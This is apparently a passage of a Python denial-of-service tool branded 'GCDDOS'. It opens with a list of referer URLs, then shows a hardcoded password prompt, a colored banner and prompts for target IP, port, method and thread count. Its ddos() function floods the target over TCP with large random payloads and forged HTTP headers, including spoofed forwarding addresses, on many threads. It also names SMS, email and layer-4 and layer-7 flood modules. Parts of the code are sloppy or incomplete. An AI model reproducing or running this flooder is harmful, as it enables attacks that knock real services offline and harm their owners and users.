    'http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=',
    'https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=',
    'https://play.google.com/store/search?q=',
    'http://jigsaw.w3.org/css-validator/validator?uri=',
    'https://add.my.yahoo.com/rss?url=', 'http://www.google.com/?q=',
    'https://www.cia.gov/index.html', 'https://www.google.ad/search?q=',
    'https://www.google.ae/search?q=', 'https://vk.com/profile.php?redirect=',
    'http://jigsaw.w3.org/css-validator/validator?uri=',
    'https://add.my.yahoo.com/rss?url=',
    'http://www.google.com/?q=',
    'http://www.usatoday.com/search/results?q=',
    'http://engadget.search.aol.com/search?q=',
    'https://www.google.ae/search?q=', 'https://www.google.com.af/search?q=',
    'https://www.google.com.ag/search?q=',
    'https://www.google.com.ai/search?q=', 'https://www.google.al/search?q=',
    'http://www.usatoday.com/search/results?q=',
    'http://engadget.search.aol.com/search?q=',
    'https://steamcommunity.com/market/search?q=',
    'http://filehippo.com/search?q=',
    'http://www.topsiteminecraft.com/site/pinterest.com/search?q=',
    'http://eu.battle.net/wow/en/search?q=',
'http://help.baidu.com/searchResult?keywords=',
'http://www.bing.com/search?q=',
'https://www.yandex.com/yandsearch?text=',
'https://duckduckgo.com/?q=',
'http://www.ask.com/web?q=',
'http://search.aol.com/aol/search?q=',
'https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=',
'https://drive.google.com/viewerng/viewer?url=',
'http://validator.w3.org/feed/check.cgi?url=',
'http://host-tracker.com/check_page/?furl=',
'http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=',
'http://jigsaw.w3.org/css-validator/validator?uri=',
'https://add.my.yahoo.com/rss?url=',
'http://www.google.com/?q=',
'http://www.usatoday.com/search/results?q=',
'http://engadget.search.aol.com/search?q=',
'https://steamcommunity.com/market/search?q=',
'http://filehippo.com/search?q=',
'http://www.topsiteminecraft.com/site/pinterest.com/search?q=',
'http://eu.battle.net/wow/en/search?q=']

os.system("title Ghost Login")
pasw = "gc"

for i in range(3):
    pwd = input(" Password => ")
    j = 3
    if (pwd == pasw):
        time.sleep(3)
        print("\033[1;30;40mLoad\033[1;36;40ming... \n")
        break
    else:
        time.sleep(2)
        print("\033[1;31;40mWrong\033[1;33;40mPassword \n")
        continue
time.sleep(2)
print("\033[1;32;40m WelcomeT\033[1;36;40mo GCDDOS\033[1;35;40m Network")
time.sleep(2)

os.system("title GC NetWork's")
os.system("cls")
print("""
\033[38;2;88;5;255m
\033[38;2;88;5;255m░███\033[38;2;255;0;0m███╗\033[38;2;255;0;0m██╗░░\033[38;2;0;255;0m██╗\033[1;4m█████\033[4m█╗░░███\033[30;40;196m██╗░░██████╗
\033[38;2;88;5;255m██\033[38;2;255;0;0m╔════╝\033[38;2;255;0;0m██║░░\033[38;2;0;255;0m██║\033[1;4m██╔══\033[4m██╗██╔══██\033[30;40;196m╗██╔════╝
\033[38;2;88;5;255m██\033[38;2;255;0;0m╔════╝\033[38;2;255;0;0m██║░░\033[38;2;0;255;0m██║\033[1;4m██╔══\033[4m██╗██╔\033[30;40;196m══ █╗██╔════╝
\033[38;2;88;5;255m╚█\033[38;2;255;0;0m████╗░\033[38;2;255;0;0m████\033[38;2;0;255;0m██\033[1;4m█║██║░░██║█\033[4m█║░░█\033[30;40;196m█║╚█████╗░
\033[38;2;88;5;255m░╚\033[38;2;255;0;0m═══██╗\033[38;2;255;0;0m██╔\033[38;2;0;255;0m══██║\033[1;4m██║░░█\033[4m█║██║░\033[30;40;196m░██║░╚═══██╗
\033[38;2;88;5;255m██\033[38;2;255;0;0m████╔╝\033[38;2;255;0;0m██║░\033[38;2;0;255;0m░██║██\033[1;4m████\033[4m╔╝╚█████\033[30;40;196m╔╝██████╔╝
\033[38;2;88;5;255m╚═════╝░\033[38;2;255;0;0m╚═╝░░╚═╝╚═════╝░░╚══\033[38;2;0;255;0m══╝░╚═══\033[1;4m══╝\033[4m░
 """)

print("")
ip = input(Fore.RESET + "TARGET => ")
port = int(input(Fore.RESET + "PORT => "))
choice = input(Fore.RESET + "METHOD => ")
times =  int(input(Fore.RESET + "TIME => "))
threads = int(input(Fore.RESET + "SIZE => "))

def randomip():
  randip = []
  randip1 = random.randint(1,255)
  randip2 = random.randint(1,255)
  randip3 = random.randint(1,255)
  randip4 = random.randint(1,255)
  
  randip.append(randip1)
  randip.append(randip2)
  randip.append(randip3)
  randip.append(randip4)

def spoofer():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return assemebled

def methods(method):
    if method == "SMS":
        dir = "tools.SMS.main"
    elif method == "EMAIL":
        dir = "tools.EMAIL.main"
    elif method in ("LDAP", "UDP", "TCP", "SAMP", "DHCP", "OVH"):
        dir = f"tools.L4.{method.lower()}"
    elif method in ("HTTP", "HTTPS", "NUKE"):
        dir = f"tools.L7.{method.lower()}"

def ddos():
    get_host = "GET HTTP/1.1\r\nHost: " + ip + "\r\n"
    post_host = "POST HTTP/1.1\r\nHost: " + ip + "\r\n"
    get_data = "GET https://check-host.net//1.1\r\nHost: " + ip + "\r\n"
    referer = "Referer: " + random.choice(referers) + ip + "\r\n"
    connection = "Connection: Keep-Alive\r\n" + "\r\n"
    content = "Content-Type: application/x-www-form-urlencoded\r\nX-Requested-With: XMLHttpRequest\r\n charset=utf-8\r\n"
    socks = "socks5: " + random.choice(socks5) + "\r\n"
    length = "Content-Length: 0\r\n"
    forward = "X-Forwarded-For: 1\r\n"
    forwards = "Client-IP: " + ip + "\r\n"
    accept = random.choice(acceptall) + "\r\n"
    mozila = "User-Agent: " + random.choice(accept) + "\r\n"
    useragens = "User-Agent: " + random.choice(useragend) + "\r\n"
    secret = "proxy: " + random.choice(proxy) + ip + "\r\n"
    connection += "Cache-Control: max-age=0\r\n"
    connection += "pragma: no-cache\r\n"
    connection += "X-Forwarded-For: " + spoofer() + "\r\n"
    header = post_host + socks + get_host + referer + mozila + useragens + forward + secret + content + connection + length + "\r\n\r\n"
    randomip = str(random.randint(1, 255)) + "." + str(random.randint(
        0, 255)) + "." + str(random.randint(0, 255)) + "." + str(
            random.randint(0, 255)) + "\r\n"
    useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
    request = post_host + get_host + socks + forward + useragens + secret + connection + mozila + forwards + header + useragent + accept + length + randomip + referer + content + "\r\n"
    data = random._urandom(921491)
    data1 = random._urandom(250000)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((ip,port))
            s.send(data)
            s.send(data)
            s.send(data)
            s.send(data)
            s.send(data)
            s.send(data)
            s.send(data)
            s.send(data)
            s.send(data)
            s.send(data)
            s.send(data)
            s.send(data)
            s.sendall(str.encode(request))
            s.sendall(str.encode(request))
            s.sendall(str.encode(request))
            s.sendall(str.encode(request))
            s.send(data)
            s.send(data)
            s.send(data)
            s.send(data)
            s.send(data)
            s.send(data)
            s.send(data)
            s.send(data)
            s.send(data)
            s.send(data)
            s.send(data)
            s.send(data)
            s.sendall(str.encode(request))
            s.sendall(str.encode(request))
            s.sendall(str.encode(request))
            s.sendall(str.encode(request))
            s.sendall(str.encode(request))
            s.send(data1)
            s.send(data1)
            s.send(data1)
            s.send(data1)
            s.send(data1)
            s.send(data1)
            s.send(data1)
            s.send(data1)
            s.send(data1)
            s.send(data1)
            s.send(data1)
            s.send(data1)
            s.sendall(str.encode(request))
            s.sendall(str.encode(request))
            s.sendall(str.encode(request))
            s.sendall(str.encode(request))
            s.send(data1)
            s.send(data1)
            s.send(data1)
            s.send(data1)
            s.send(data1)
            s.send(data1)
            s.send(data1)
            s.send(data1)
            s.send(data1)
            s.send(data1)
            s.send(data1)
            s.send(data1)
            s.sendall(str.encode(request))
            s.sendall(str.encode(request))
            s.sendall(str.encode(request))
            s.sendall(str.encode(request))
            s.sendall(str.encode(request))
            s.sendall(str.encode(request))
            s.sendall(str.encode(request))
            s.sendall(str.encode(request))
            s.sendall(str.encode(request))
            s.sendall(str.encode(request))
            s.sendall(str.encode(request))
            s.sendall(str.encode(request))
            s.sendall(str.encode(request))
            s.sendall(str.encode(request))
            s.sendall(str.encode(request))
            for x in range(60000):
                s.send(data)
                s.send(data)
                s.send(data)
                s.send(data)
                s.send(data)
                s.send(data)
                s.send(data)
                s.send(data)
                s.send(data)
                s.send(data)
                s.send(data)
                s.send(data)
                s.send(data)
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.send(data1)
                s.send(data1)
                s.send(data1)
                s.send(data1)
                s.send(data1)
                s.send(data1)
                s.send(data1)
                s.send(data1)
                s.send(data1)
                s.send(data1)
                s.send(data1)
                s.send(data1)
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
            print("Attack Sent to " + ip)
        except :
            s.close()

for y in range(threads):
    th = threading.Thread(target = ddos,daemon=True)
    th.start()

